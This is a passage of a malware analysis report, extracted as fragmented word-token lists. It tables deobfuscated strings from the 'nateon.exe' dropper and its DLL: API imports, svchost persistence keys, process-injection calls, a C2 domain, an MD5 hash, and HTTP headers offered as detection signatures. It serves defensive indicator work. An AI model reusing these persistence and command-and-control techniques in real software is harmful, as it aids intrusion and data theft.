"\\\\.\\pipe\\a%d<\\x00><\\u3CC4", ">", "<", "\\u3C18><\\u9C08><\\u3C8A", ">", "\"", "1000B70E", "10022D5C", "\"", "ServiceDll", "\"", "1000F2B1", "100230B8", "\"", "\\\\.\\pipe\\b%d<\\x00><\\u7080", ">", "<", "\\u0C17><\\u4C49><\\uEC10", ">", "\"", "1000B77F"], ["10022D74", "\"", "RegOpenKeyExW", "\"", "1000F38F", "100230D4", "\"", "CMD.EXE", "\""], ["1000B7DD", "10022D84", "\"", "RegCreateKeyExW", "\"", "1000FC7B", "100230E8", "\""], ["SQLAllocHandle\"53", "1000B83D", "10022D98", "\"", "RegQueryValueExW", "\"", "1000FCD0", "100230F8", "\"", "SQLSetEnvAttr", "\"", "1000B899", "10022DAC", "\"", "RegSetValueExW", "\"", "1000FD2A", "10023108", "\"", "SQLDriverConnectW", "\"", "1000B8F8", "10022DBC", "\"", "RegEnumKeyExW", "\"", "1000FD88", "1002311C", "\"", "SQLDisconnect", "\"", "1000B953", "10022DCC", "\"", "RegCloseKey", "\"", "1000FDD7", "1002312C", "\"", "SQLFreeHandle", "\"", "1000B9A2", "10022DDC", "\"", "SHCopyKeyW", "\"", "1000FE29", "1002313C", "\"", "SQLExecDirectW", "\""], ["1000B9F9", "10022E08", "\"", "SHDeleteKeyW", "\"", "1000FE7D", "1002315C", "\"", "SQLNumResultCols", "\"", "1000BA4B", "10022E18", "\"", "SHDeleteValueW", "\"", "1000FECF", "1002319C", "\"", "SQLMoreResults", "\"", "1000BAA0", "10022E28", "\"", "SHGetValueW", "\"", "10010339", "10023170", "\"", "SQLColAttributeW", "\"", "1000BE37", "10022DE8", "\"", "SHEnumKeyExW", "\"", "100104B5", "10023184", "\"", "SQLFetch", "\"", "1000C492", "10022DF8", "\"", "SHEnumValueW", "\"", "1001052B", "10023190", "\"", "SQLGetData", "\"", "1000CAFB", "10022E38", "\"", "VirtualAlloc", "\"", "1001057D", "100231AC", "\"", "NULL", "\"", "1000CB53", "10022E48", "\"", "VirtualFree", "\"", "10010627", "1002314C", "\"", "SQLGetDiagRecW", "\""], ["1000CBA9", "10022E58", "\"", "GetProcessWindowStation", "\"", "1000CBF3", "10022E88", "\"", "SetProcessWindowStation", "\"", "53"], ["The", "imported", "functions", "with", "an", "\u2018", "SQL", "\u2019", "prefix", "were", "presumably", "used", "to", "access", "the", "SK", "Communications", "databases", "."], ["PAGE", "18", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "10010739", "100231DC", "\"", "ExitWindowsEx", "\"", "10012DF9", "10023604", "\"", "GetTokenInformation", "\"", "1001078A", "100231EC", "\"", "InitiateSystemShutdownA", "\"", "10012E54", "10023630", "\"", "LookupPrivilegeValueW", "\"", "10010808", "100231C8", "\"", "LockWorkStation", "\"", "10012EA8", "10023648", "\"", "AdjustTokenPrivileges", "\"", "100108CC", "10023208", "\"", "SeShutdownPrivilege", "\"", "10012F02", "100236B4", "\"", "GetFileVersionInfoW", "\"", "100109C8", "10023234", "\"", "SeShutdownPrivilege", "\"", "10012F59"], ["100236CC", "\"", "VerQueryValueW", "\"", "10010ACC", "10023260", "\"", "SeShutdownPrivilege", "\"", "100130F1", "1002353C", "\"", "GetWindowsDirectoryW", "\"", "10010D37", "100231B8", "\"", "MessageBoxW", "\"", "10013158", "10023554", "\"", "GetSystemDirectoryW", "\"", "10010D95", "100232F0", "\"", "GetConsoleMode", "\"", "100132AD", "10023588", "\"", "GetComputerNameW", "\"", "10010DE7", "10023318", "\"", "SetConsoleCtrlHandler", "\"", "1001337D", "10023660", "\"", "GetUserNameW", "\"", "10010E3B", "1002337C", "\"", "SetConsoleScreenBufferSize", "\"", "10013445", "10023748", "\"", "CLSID", "\"", "10010EC2", "10023330", "\"", "WriteConsoleInputW", "\"", "10013465", "10023758", "10010F47", "100232CC", "\"", "GetConsoleCP", "\"", "\"", "SOFTWARE\\CLASSES\\SAFEGUI", "<"], ["\\x00><\\u40F0><\\u380B>\"54", "10010FC1", "100232DC", "\"", "GetConsoleOutputCP", "\"", "100134D4", "1002378C", "\"", "CLSID", "\"", "10011044", "10023300", "\"", "GetConsoleDisplayMode", "\"", "100134EA", "10023758", "10011096", "100233AC", "\"", "GetConsoleCursorInfo", "\"", "\"", "SOFTWARE\\CLASSES\\SAFEGUI", "<", "\\x00><\\u40F0><\\u380B", ">", "\"", "1001110F", "10023360", "\"", "GetConsoleScreenBufferInfo", "\"", "1001357C", "1002352C", "\"", "GetSystemTime", "\"", "1001134D", "10023398", "\"", "ReadConsoleOutputW", "\"", "100136DC", "100237A0", "\"", "%", "2.2X%2.2X%2.2X%2.2X%2.2X", "%", "2.2X%2.2X%2.2X", "\"", "10011617", "100233D4", "\"", "CMD", "\"", "10013749", "100237F4", "\"", "%", "ALLUSERSPROFILE%", "\"", "10011643", "100233E0", "\"", "\"", "100137C6", "10023820", "1001166F", "100233E8", "\"", "/Q"], ["\"", "100116A3", "100232A8", "\"", "AllocConsole", "\"", "\"", "\\Documents", "and", "Settings\\All", "Users<\\x00><\\uC030><\\u0848", ">", "\"", "100116F3", "100232B8", "\"", "GetConsoleWindow", "\"", "10013807", "10023868", "10011738", "1002328C", "\"", "ShowWindow", "\"", "\"", "\\Documents", "and", "Settings\\All"], ["Users<\\x00><\\u78D8><\\u6090", ">", "\"", "100117A2", "10023298", "\"", "GetStdHandle", "\"", "1001384C", "100238B0", "10011AE2", "100233C4", "\"", "FreeConsole", "\"", "\"", "\\Documents", "and", "Settings\\All", "Users<\\x00><\\u3818><\\u20D0", ">", "\"", "10011CAA", "100233F0", "\"", "CONIN$", "\"", "1001389A", "100238F8", "\"", "\\ProgramData<\\x00><\\uE8A8", ">", "\"", "10011D3A", "10023344", "\"", "GenerateConsoleCtrlEvent", "\"", "100138D8", "10023914", "\"", "\\ProgramData<\\x00><\\uFFFD", ">", "\"", "10011E6D", "10023400", "\"", "CONIN$", "\"", "10013907", "10023930", "\"", "\\<\\x00><\\uB898", ">", "\"", "10011EAD", "10023410"], ["\"", "CONOUT$", "\"", "10013B54", "10023938", "\"", "\\*.*<\\x00><\\u140C", ">", "\"", "10011F88", "10023424", "\"", "CreateWindowExW", "\"", "10013E1F", "10023944", "\"", ".EXE", "\""], ["10011FE7", "10023438", "\"", "SetWindowLongW", "\"", "10013EFB", "10023950", "\"", ".EXE", "\""], ["1001203D", "10023448", "\"", "DestroyWindow", "\"", "1001404B", "1002395C", "\"", "\\??\\<\\x00><\\u742C><\\uCC38", ">", "\"", "1001208C", "10023458", "\"", "TranslateMessage", "\"", "1001409E", "10023968", "100120DB", "1002347C", "\"", "SetTimer", "\""], ["\"", "\\SystemRoot\\<\\x00><\\u0808", ">", "<", "\\u5834", ">", "\"", "10012136", "10023488", "\"", "KillTimer", "\"", "100140F1", "10023984", "\"", "\\<\\x00><\\u18B8", ">", "\"", "1002361C", "\"", "LookupAccountSidW", "\"", "10012188", "100234A4", "\"", "DispatchMessageW", "\"", "10014219", "100121D7", "100234F8", "\"", "WTSUnRegisterSessionNotificati", "on", "\"", "100143AE", "10023670", "\"", "WTSEnumerateProcessesW", "\"", "10014461", "10023688", "\"", "WTSFreeMemory", "\"", "100122CB", "10023494", "\"", "PeekMessageW", "\"", "100144FB", "10023698", "\"", "GetFileVersionInfoSizeW", "\"", "10012379", "1002351C", "\"", "static", "\"", "1001459E", "1002398C", "1001255F", "100234D8", "\"", "WTSRegisterSessionNotification", "\"", "\"", "\\VarFileInfo\\Translation<\\x00", ">"], ["<", "\\uEC54><\\u2C48", ">", "\"", "10012687", "100234B8", "\"", "MsgWaitForMultipleObjectsEx", "\"", "10014605", "100239C0", "10012779", "1002346C", "\"", "DefWindowProcW", "\"", "\"", "\\StringFileInfo\\%4.4X%4.4X\\%s", "<", "\\x00><\\uF8D8><\\uE090><\\u2", "379", ">", "\"", "10012C0D", "1002356C", "\"", "QueryPerformanceCounter", "\"", "10014992", "10023A00", "\"", "IsWow64Process", "\"", "10012C5C", "1002359C"], ["\"", "GetFileAttributesW", "\"", "10012CAB", "100235B0", "\"", "ExpandEnvironmentStringsW", "\"", "10012D00", "100235CC", "\"", "GetModuleFileNameW", "\"", "10012D55", "100235E0", "\"", "OpenProcessToken", "\"", "10012DAA", "100235F4", "\"", "GetLengthSid", "\""], ["The", "unusual", "hardcoded", "registry", "key", "\u2018", "SOFTWARE\\CLASSES\\SAFEGUI", "\u2019", "can", "be", "used", "to", "link", "\u2018", "nateon.exe", "\u2019", "with", "the", "malware", "that", "has", "the", "MD5", "hash", "6C6A", "DBD0", "8727", "6AE8"], ["9F82", "6258", "2798"], ["B708", "and", "calls", "back", "to", "the", "domain", "\u2018", "expre.dyndns.tv", "\u2019", "on", "TCP", "port", "443", "."], ["It", "may", "also", "be", "used", "as", "a", "signature", "to", "identify", "other", "similar", "malware", "."], ["(", "GFI", "SandBox", ",", "2011", ")", "54", "PAGE", "19", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "100149F5", "10023A10", "\"", "GetCurrentProcessId", "\"", "10016519", "10023DA4", "\"", "\"", "<", "\\x00><\\u74AC", ">", "\"", "10014A3F", "10023A28", "\"", "ProcessIdToSessionId", "\"", "1001654C", "10023AF4", "\"", "RqSkce", "\"", "10014A91", "10023A40", "\"", "DuplicateTokenEx", "\"", "10016582", "10023DAC", "\"", "\"", "10014AEE", "10023A54", "\"", "SetTokenInformation", "\"", "100165BE", "10022208", "\"", "SMI", "\"", "10014B46", "10023A98", "\"", "CreateProcessAsUserW", "\"", "100165FD", "10023DB4", "\"", "\"", "100151CE", "10023AB0", "\"", ".DLL", "\""], ["1001663B", "10023DBC", "\"", "\"", "<", "\\x00><\\u14EC", ">"], ["\"", "10015202", "10023ABC", "\"", "RUNDLL32.EXE", "\"", "10016691", "10023DC4", "\"", "\"", "<", "\\x00><\\u28E8", ">", "\"", "1001522E", "10023ADC", "\"", "\"", "<", "\\x00><\\u6010", ">", "\"", "1001689E", "10023BE0", "\"", "DeleteFileW", "\"", "10015268", "10023AE4", "\"", "\\<\\x00><\\u3080", ">", "\"", "100169F3", "10023C14", "\"", "GetModuleFileNameA", "\"", "100152A0", "10023AEC", "\"", "\"", "<", "\\x00><\\u6868", ">", "\"", "10016A4A", "10023BD0", "\"", "CreateFileA", "\""], ["100152CC", "10023AF4", "\"", "RqSkce", "\"", "10016DAA", "10023DEC", "\"", "QueryServiceStatusEx", "\""], ["100152F8"], ["10023B04", "\"", "\"", "10016E03", "10023E04", "\"", "ChangeServiceConfig2W", "\"", "10015324", "10022220", "\"", "SMRAC", "\"", "10016E59", "10023E1C", "\"", "CreateServiceW", "\"", "100153FC", "10023B0C", "\"", "UserEnv.dll", "\"", "1001779C", "10023E30", "1001542A", "10023B1C", "\"", "CreateEnvironmentBlock", "\"", "10015456", "10023B34", "\"", "DestroyEnvironmentBlock", "\"", "\"", "SOFTWARE\\Microsoft\\Windows", "NT\\CurrentVersion\\SvcHost<\\x0", "0><\\uA8E8><\\uC40C><\\uFFFD"], [">", "<", "\\u9050", ">", "\"", "100155C1", "10023B50", "\"", ".DLL"], ["\"", "1001791E", "10023E9C", "\"", "\"", "1001561B", "10023B5C", "\"", "RUNDLL32.EXE", "\"", "10017956", "10023E30", "10015656", "10023B7C", "\"", "\"", "<", "\\x00><\\u843C", ">", "\"", "1001569E", "10023B84", "\"", "\\<\\x00><\\u68A8", ">", "\"", "\"", "SOFTWARE\\Microsoft\\Windows", "NT\\CurrentVersion\\SvcHost<\\x0", "0><\\uA8E8><\\uC40C><\\uFFFD"], [">", "<", "\\u9050", ">", "\"", "100156EF", "10023B8C", "\"", "\"", "<", "\\x00><\\uCCF4", ">", "\"", "10017A37", "10023E30", "10015722", "10023AF4", "\"", "RqSkce", "\"", "1001575D"], ["10023B04", "\"", "\"", "\"", "SOFTWARE\\Microsoft\\Windows", "NT\\CurrentVersion\\SvcHost<\\x0", "0><\\uA8E8><\\uC40C><\\uFFFD"], [">", "<", "\\u9050", ">", "\"", "10015790", "10022230", "\"", "SMRACU", "\"", "10017BE1", "10023EA0", "\"", "\"", "100157E1", "10023A6C", "\"", "ImpersonateLoggedOnUser", "\"", "10017C10", "10023E30", "1001586B", "10023A88", "\"", "RevertToSelf", "\"", "10015943", "10023B94", "\"", "WTSGetActiveConsoleSessionId", "\""], ["\"", "SOFTWARE\\Microsoft\\Windows", "NT\\CurrentVersion\\SvcHost<\\x0", "0><\\uA8E8><\\uC40C><\\uFFFD"], [">", "<", "\\u9050", ">", "\"", "10015C5E", "10023BB4", "\"", "NT", "AUTHORITY", "\"", "10017C5F", "10023EA4", "\"", "VirtualAllocEx", "\"", "10015D15", "10023BF0", "\"", "MoveFileExW", "\"", "10017CBC", "10023EB4", "\"", "VirtualFreeEx", "\"", "10015D68", "10023C00", "\"", "GetModuleHandleA", "\"", "10017D15", "10023EC4", "\"", "WriteProcessMemory", "\"", "100160D5", "10023C28", "\"", "%"], ["SystemRoot%\\system32\\sv"], ["chost.exe", "\u00adk", "LocalService<\\x00><\\uBC64", ">", "<"], ["\\uD4CC>\"55", "10017D74", "10023EEC", "\"", "GetWindowThreadProcessId", "\"", "10017DC6", "10023F18", "\"", "GetExitCodeThread", "\""], ["10017E18", "10023F48", "\"", "EqualSid", "\"", "\"", "SYSTEM\\CurrentControlSet\\Serv", "ices<\\x00><\\u54AC><\\u8C34", ">", "\"", "10017E6A", "10023F54", "\"", "FreeSid", "\"", "10017EB9", "10023F60", "\"", "ShellExecuteExW", "\"", "10017F08", "10023F74", "\"", "SHCreateItemFromParsingName", "\"", "10016108", "10023C90", "10016138", "10023CD8", "\"", "\\<\\x00><\\uC4FC", ">", "\"", "10016183", "10023CE0", "\"", "\\Parameters<\\x00><\\uA8A8", ">", "\"", "100161C2", "10023CFC", "\"", "LocalService", "\"", "10017F61", "10023FA4", "\"", "CoCreateInstance", "\"", "10016267", "10023D18", "\"", "ServiceDll", "\"", "10018226", "10023F2C", "\"", "AllocateAndInitializeSid", "\"", "100162B6", "10023AF4"], ["\"", "RqSkce", "\"", "100184E2", "10023FC8", "\"", ".DLL"], ["\"", "100162C8", "10023AF4"], ["\"", "RqSkce", "\"", "10018534", "10023FD4", "\"", "\"", "<", "\\x00><\\u7CA4", ">", "\"", "100162E3", "10023D30", "\"", "ServiceMain", "\"", "1001856E", "10023FDC", "\"", "\\<\\x00><\\u9C04", ">", "\"", "10016389", "10023D4C", "\"", "LocalService", "\"", "100185A6", "10023FE4", "\"", "\"", "<", "\\x00><\\u1020", ">", "\"", "100163EF", "10023D68", "\"", ".DLL", "\"", "100185D2", "10023AF4"], ["\"", "RqSkce", "\"", "1001642B"], ["10023D74", "\"", "\\<\\x00><\\u344C", ">", "\"", "100185FE", "10023FEC", "\"", "\"", "1001649E"], ["10023D7C", "\"", "RUNDLL32.EXE", "\"", "1001862A", "10022208", "\"", "SMI", "\"", "100164D0", "10023D9C", "\"", "\"", "<", "\\x00><\\u8070", ">", "\"", "100186F4", "1002401C", "\"", "\\SYSPREP<\\x00><\\uF8D8", ">", "\"", "10018720", "10024030", "\"", "\\SYSPREP.EXE<\\x00><\\u18B8", ">", "\"", "The", "\u2018", "nateon.exe", "\u2019", "dropper", "configures", "\u2018", "winsvcfs.dll", "\u2019", "to", "run", "inside", "the", "trusted", "operating", "system", "process", "\u2018", "svchost.exe", "\u2019", "."], ["55", "PAGE", "20", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "1001881A", "10024058", "\"", "LoadLibraryW", "\"", "10018836", "10024068", "\"", "kernel32.dll", "\"", "10018879", "10024078", "\"", "FreeLibrary", "\"", "10018890", "10024068", "\"", "kernel32.dll", "\"", "10018B30", "10022B68", "\"", "\\<\\x00><\\uFFFD", ">", "\"", "CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "00><\\u70C0><\\u28FB><\\u38E4", ">", "<", "\\u680B", ">", "\"", "1001AB05", "10024218", "\"", "GetSystemDefaultLCID", "\"", "1001AB81", "1002430C", "\"", "%", "s", "\"", "1001ABC1", "10022658", "\"", "%", "s", "\"", "1001AC02", "10024314", "\"", "\"", "1001AC23", "10024318", "\"", "%", "s", "\"", "1001AC6B", "10024320", "\"", "%", "s", "\"", "1001ACA4", "10022658", "\"", "%", "s", "\"", "1001ACE1", "10024328", "\"", "\"", "1001ACFC", "1002432C", "\"", "%", "s", "\"", "1001B0D7", "10024334", "\"", ".DLL", "\""], ["1001B11A", "10024340", "\"", "RUNDLL32.EXE", "\"", "1001B15A", "10024360", "\"", "\"", "<", "\\x00><\\u5878", ">", "\"", "1001B1B4", "10023FDC", "\"", "\\<\\x00><\\u9C04", ">", "\"", "1001B1F4", "10024368", "\"", "\"", "<", "\\x00><\\u9CE4", ">", "\"", "1001B22C", "10023AF4", "\"", "RqSkce", "\"", "1001B266", "10024370", "\"", "\"", "1001B29B", "10022214", "\"", "SMU", "\"", "1001B54A", "10024378", "\"", "RtlNtStatusToDosError", "\"", "1001B599"], ["100243B0", "\"", "RtlDecompressBuffer", "\"", "1001B5F8", "100243C8", "\"", "RtlCompressBuffer", "\"", "1001B677", "10024390", "\"", "RtlGetCompressionWorkSpaceSi", "ze", "\"", "1001BD1B", "10024288", "\"", "\\\\.\\PIPE\\RUN_AS_CONSOLE(%d", ")", "<", "\\x00><\\u7000><\\u78D8><\\u6", "090><\\u2828", ">", "\"", "10018B71", "10024088"], ["\"", "sysprep", "\"", "10018BE4", "10023F94", "\"", "CoInitializeEx", "\"", "10018C88", "1002409C", "\"", "CRYPTBASE.DLL", "\"", "10018D00", "100240BC", "\"", "\\<\\x00><\\u5C44", ">", "\"", "10018D3A", "100240C4", "\"", "sysprep", "\"", "10018D7D", "100240D8", "\"", "\\<\\x00><\\u0888", ">", "\"", "10018DBB", "100240E0", "\"", "CRYPTBASE.DLL", "\""], ["10018E1B", "10024100", "\"", "\\<\\x00><\\u1020", ">", "\"", "10018E46", "100240C4"], ["\"", "sysprep", "\"", "10018E75", "10024108", "\"", "\\<\\x00><\\u8070", ">", "\"", "10018EA7", "10024110", "\"", "sysprep.exe", "\"", "10018FB8", "10023FB8", "\"", "CoUninitialize", "\"", "1001903E", "1002412C", "\"", "CRYPTBASE.DLL", "\"", "100190B1", "1002414C", "\"", ".DLL", "\"", "10019112", "10024158", "\"", "RUNDLL32.EXE", "\"", "1001914B", "10024178", "\"", "\"", "<", "\\x00><\\uF858", ">", "\"", "10019197", "10024180", "\"", "\\<\\x00><\\u6010", ">", "\"", "100191E0", "10024188", "\"", "\"", "<", "\\x00><\\uF42C", ">", "\"", "10019219", "10023AF4", "\"", "RqSkce", "\"", "10019252", "10024190", "\"", "\"", "1001928B", "10022208", "\"", "SMI", "\"", "1001949A", "10023ED8", "\"", "CreateRemoteThread", "\"", "1001BEDB", "100243DC", "\"", "TerminateThread", "\"", "10024418", "\"", "SetUnhandledExceptionFilter", "\"", "10019534", "10024198", "\"", "Shell_TrayWnd", "\""], ["1001BF2F", "10019558", "10023F08", "\"", "FindWindowA", "\"", "1001BF7E", "100243F0", "\"", "TlsAlloc", "\"", "1002440C", "\"", "TlsFree", "\"", "100195E4", "100241C8", "\"", "GetCurrentThread", "\"", "1001C028", "1001962E", "100241DC", "\"", "SetThreadPriority", "\"", "1001C0CB", "100243FC", "\"", "TlsGetValue", "\"", "10024438", "\"", "ECount=%d", ",", "\"", "100197F3", "10024204", "\"", "GetSystemMetrics", "\"", "1001C139", "10019842", "10024230"], ["\"", "gethostbyname", "\"", "1001C180", "10024450", "\"", "EAddr=0x%p", ",", "\"", "\"", "lstrcatW", "\"", "1001C1CC", "1002446C", "\"", "ECode=0x%x", ",", "\"", "10024488", "\"", "ESalF=%d", "\"", "10019891", "10024240", "100198E3", "1002424C", "\"", "ResumeThread", "\"", "1001C214", "10019939", "1002425C", "\"", "QueueUserAPC", "\"", "1001C2D4", "1002449C", "\"", "MessageBoxA", "\"", "\"", "\\\\.\\PIPE\\RUN_AS_CONSOLE_USE", "R(%d)<\\x00><\\u0CB4><\\u40E5", ">", "<", "\\u4033><\\uC0C0", ">", "\"", "1001C32C", "100244AC", "\"", "lstrcpyA", "\"", "1001C380", "100244B8", "\"", "InternetOpenA", "\"", "1001C3D4", "100244C8", "\"", "InternetOpenUrlA", "\"", "1001C431", "100244DC", "\"", "InternetReadFile", "\"", "1001C489", "100244F0", "\"", "InternetCloseHandle", "\"", "1001C510", "10024508", "\"", "XXXXXXXX\"57", "1001C5E3", "10024514", "\"", "DEMO", "\"", "1001C618", "10024520", "\"", "TVT", "\"", "1001C658", "10024528", "\"", "TVT", "DEMO", "\"", "1001C6DA", "10024534", "\"", "192.168.0.200", "\"", "1001A25C", "100242C8", "1001A419", "1002426C", "\"", "download.windowsupdate.co"], ["m\"56", "1001A66A", "10024288", "\"", "\\\\.\\PIPE\\RUN_AS_CONSOLE(%d", ")", "<", "\\x00><\\u7000><\\u78D8><\\u6", "090><\\u2828", ">", "\"", "1001A914", "100241F0", "\"", "GlobalMemoryStatus", "\"", "1001AA61", "100236DC", "\"", "~MHZ", "\"", "1001AA7F", "100236E8", "\"", "HARDWARE\\DESCRIPTION\\SYS", "TEM\\CENTRALPROCESSOR\\0<\\x", "56"], ["The", "hardcoded", "domain", "name", "\u2018", "download.windowsupdate.com", "\u2019", "is", "used", "to", "detect", "internet", "connectivity", "."], ["This", "domain", "name", "can", "be", "overridden", "in", "the", "malware", "\u2019s", "configuration", "."], ["57"], ["This", "set", "of", "hardcoded", "strings", ",", "\u2018", "XXXXXXXX", "\u2019", ",", "\u2018", "DEMO", "\u2019", ",", "\u2018", "TVT", "\u2019", ",", "\u2018", "TVT", "DEMO", "\u2019", ",", "and", "\u2018", "192.168.0.200", "\u2019", "are", "hardcoded", "values", "overridden", "by", "the", "malware", "\u2019s", "configuration", "."], ["PAGE", "21", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "1001C717", "10024534", "\"", "192.168.0.200", "\"", "1001EFDD", "100246FC", "\"", "HttpOpenRequestA", "\"", "1001C74F", "10024548", "\"", "\"", "1001F113", "10024560", "\"", "%", "2.2X", "\"", "1001C7BF", "1002454C", "\"", "CONFIG\u00adDESTORY!\"58", "1001F189", "10024570", "1001CC41", "10024560", "\"", "%", "2.2X", "\"", "\"", "Software\\SafeSvc<\\x00><\\uB4E", "C", ">", "\"", "1001CCB2", "10024570", "\"", "Software\\SafeSvc<\\x00><\\uB"], ["4EC>\"59", "1001F278", "100247D4", "\"", ":", "\"", "1001F308", "100247D8", "\"", "Proxy\u00adAuthorization", ":", "Basic", "%", "s<\\r><\\n><\\x00", ">", "\u00f6L", "\"", "1001F39B", "100247FC", "\"", "X\u00adSession\"62", "1001F3BC", "10024808", "\"", "%", "s", ":", "%", "d", "\"", "1001CD54", "10024594", "\"", "%", "2.2X", "\"", "1001CD98", "100245A4", "\"", "Software\\SafeSvc<\\x00><\\u40F", "0"], [">", "\"", "1001CDE7", "100245C8", "\"", "socket", "\"", "1001F41E", "10024810", "\"", "X\u00adStatus", "\"", "1001CE41", "100245D0", "\"", "bind", "\"", "1001F43F", "1002481C", "\"", "%", "s", ":", "%", "d", "\"", "1001CE94", "100245E0", "\"", "setsockopt", "\"", "1001F49B", "10024824", "\"", "X\u00adSize", "\"", "1001CEEE", "100245EC"], ["\"", "shutdown", "\"", "1001F4B9", "1002482C", "\"", "%", "s", ":", "%", "d", "\"", "1001CF3F", "100245F8", "\"", "closesocket", "\"", "1001F507", "10024834", "\"", "X\u00adSn", "\"", "1001CF95", "10024608", "\"", "ioctlsocket", "\"", "1001F525", "1002483C", "\"", "%", "s", ":", "%", "d", "\"", "1001CFEC", "10024620", "\"", "htons", "\"", "1001F776", "10024844", "\"", "\"", "1001D03B", "10024634", "\"", "WSAGetLastError", "\"", "1001F7BB", "10024848", "\"", "\"", "1001D085", "10024648", "\"", "lstrcpynA", "\""], ["1001F7FC", "100247FC", "\"", "X\u00adSession", "\"", "1001D45C", "100245D8", "\"", "recv", "\"", "1001F845", "10024810", "\"", "X\u00adStatus", "\"", "1001D5C1", "10024654", "\"", "\"", "1001F889", "10024824", "\"", "X\u00adSize", "\"", "1001D67C", "10024658", "\"", "Proxy\u00adAuthorization", ":", "Basic", "\"", "1001F8CD", "10024834", "\"", "X\u00adSn", "\"", "1001D6B5", "10024678", "\"", "GET", "\"", "1001FC5C", "1002484C", "\"", "%", "s", "\"", "1001D6E8", "10024680", "\"", "POST", "\"", "1001FC90", "10024738", "\"", "HttpQueryInfoA", "\"", "1001D71B", "10024688", "\"", "CONNECT", "\"", "10020324", "10024850", "\"", "connect", "\"", "1001D775", "10024658", "\"", "Proxy\u00adAuthorization", ":", "Basic", "\"", "10020378", "1002486C", "\"", "getpeername", "\"", "1001D886", "10024694", "\"", "\"", "100203CF", "10024894", "\"", "WSAIoctl", "\"", "1001DA8F", "10024618", "\"", "ntohs", "\"", "10020430", "100248A0", "\"", "WSAGetOverlappedResult", "\"", "1001DB03", "10024628", "\"", "inet_ntoa", "\"", "10020662", "100248B8", "\"", "WSAStartup", "\"", "1001E16D", "100246C8", "\"", "ResetEvent", "\"", "100206C5", "100248C4", "\"", "WSACleanup", "\"", "1001E1BE", "100246D4", "\"", "InternetConnectA", "\"", "10020A04", "100248D0", "1001E21A", "100246E8", "\"", "InternetWriteFile", "\"", "\"", "CONNECT", "%", "s:%d", "HTTP/1.1<\\r><\\n><\\x00", ">", "d$", "\"", "1001E272", "10024710", "\"", "HttpSendRequestExA", "\"", "10020A46", "100248EC", "1001E2CA", "10024724", "\"", "HttpEndRequestA", "\"", "\"", "Content\u00adlength", ":", "0<\\r><\\n><\\x00"], [">", "tl", "\"", "1001E31F", "10024748", "\"", "InternetSetOptionA", "\"", "10020A7A", "10024904", "\"", "Content\u00adType", ":", "text", "/", "html<\\r><\\n><\\x00>|d", "\"", "1001E376", "1002475C", "\"", "HttpAddRequestHeadersA", "\""], ["10020AAE", "10024920", "1001E3CF", "10024698", "\"", "EnterCriticalSection", "\"", "1001E420", "100246B0", "\"", "LeaveCriticalSection", "\"", "\"", "Proxy\u00adConnection", ":", "Keep\u00ad", "Alive<\\r><\\n><\\x00><\\u2584"], [">", "<", "\\u20A7", ">", "\"", "1001EE91", "10024774", "\"", "Mozilla/4.0", "(", "compatible", ";", "MSIE", "6.0", ";", "Windows", "NT"], ["5.1;SV1;\"60", "10020B10", "10024940", "\"", ":", "\"", "10020B63", "10024944", "1001EF9B", "100247B0", "\"", "/update?product", "=", "windows\"61", "\"", "Proxy\u00adAuthorization", ":", "Basic", "%", "s<\\r><\\n><\\x00><\\u255D", ">", "\"", "1001EFB6", "100247CC", "\"", "POST", "\"", "10020C3E", "10024968", "\"", "HTTP/1.0", "200", "\"", "10020C79", "10024978", "\"", "HTTP/1.1", "200", "\"", "1002124B", "1002485C", "\"", "getsockname", "\"", "100212C1", "1002487C", "\"", "WSASend", "\"", "1002134E", "10024888", "\"", "WSARecv", "\"", "10021438", "10024998", "\"", "static", "\"", "100214B6", "10024988", "\"", "GetMessageW", "\"", "The", "string", "\u2018", "CONFIG\u00adDESTORY", "!", "\u2019", "is", "displayed", "in", "a", "message", "box", "when", "\u2018", "nateon.exe", "\u2019", "detects", "corruption", "in", "its", "configuration", "."], ["It", "can", "be", "used", "as", "a", "signature", "to", "identify", "similar", "malware", "."], ["59"], ["The", "unusual", "hardcoded", "registry", "key", "\u2018", "Software\\SafeSvc", "\u2019", "can", "be", "used", "as", "a", "signature", "to", "identify", "similar", "malware", "."], ["60"], ["This", "is", "the", "user\u00adagent", "included", "in", "HTTP", "requests", "made", "by", "the", "malware", "to", "its", "configured", "command", "and", "control", "infrastructure", "."], ["This", "malformed", "user\u00adagent", "string", "can", "be", "used", "as", "a", "signature", "to", "detect", "malicious", "network", "traffic", "."], ["61"], ["This", "is", "the", "path", "included", "in", "HTTP", "requests", "made", "by", "\u2018", "nateon.exe", "\u2019", "to", "its", "configured", "command", "and", "control", "infrastructure", "."], ["This", "string", "can", "be", "used", "as", "a", "signature", "to", "detect", "malicious", "network", "activity", "."], ["58", "62"], ["The", "HTTP", "headers", "\u2018", "X\u00adSession", "\u2019", ",", "\u2018", "X\u00adStatus", "\u2019", ",", "\u2018", "X\u00adSize", "\u2019", ",", "and", "\u2018", "X\u00adSn", "\u2019", "can", "be", "used", "to", "develop", "stronger", "signatures", "for", "detection", "of", "network", "activity", "generated", "by", "the", "malware", "."], ["PAGE", "22", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["ANNEX", "B", "SUMMARY", "OF", "MALWARE", 